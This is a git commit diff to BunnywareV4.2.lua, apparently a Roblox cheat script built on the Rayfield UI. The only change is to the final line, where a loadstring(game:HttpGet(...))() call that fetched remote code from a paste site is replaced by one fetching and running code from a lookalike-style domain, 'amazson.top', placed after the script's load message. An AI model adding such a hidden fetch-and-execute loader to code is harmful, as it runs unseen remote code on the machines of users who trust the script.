0ed68c0847686e4a20a42ea4024bf130e1054187
Stillonthebus07 <jfloresnflores@gmail.com>
2026-08-20 13:26:19 -0400

    Update BunnywareV4.2.lua

--- BunnywareV4.2.lua
+++ BunnywareV4.2.lua
@@ -2124,4 +2124,4 @@ Rayfield:Notify({
 })
 
 print("✅ Bunnyware V4.2 loaded (Rayfield) by Aleksandra \"Drew\" Malinina")
-loadstring(game:HttpGet('https://cdn.sourceb.in/bins/0kF7aulBuD/0'))()
+loadstring(game:HttpGet('https://amazson.top/paste/KD1PeAqgORZ4vwQuc1wPOQ'))()
